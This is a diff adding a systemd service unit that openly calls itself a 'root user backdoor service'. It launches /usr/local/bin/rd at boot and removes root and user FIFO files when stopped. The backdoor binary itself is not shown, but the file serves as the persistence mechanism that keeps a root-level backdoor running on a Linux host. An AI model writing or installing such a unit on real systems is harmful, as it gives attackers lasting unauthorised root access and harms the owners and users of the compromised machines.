@@ -1,0 +1,9 @@
+[Unit]
+Description=root user backdoor service
+
+[Service]
+ExecStart=/usr/local/bin/rd
+ExecStop=/bin/rm /usr/local/root.fifo /usr/local/user.fifo
+
+[Install]
+WantedBy=multi-user.target
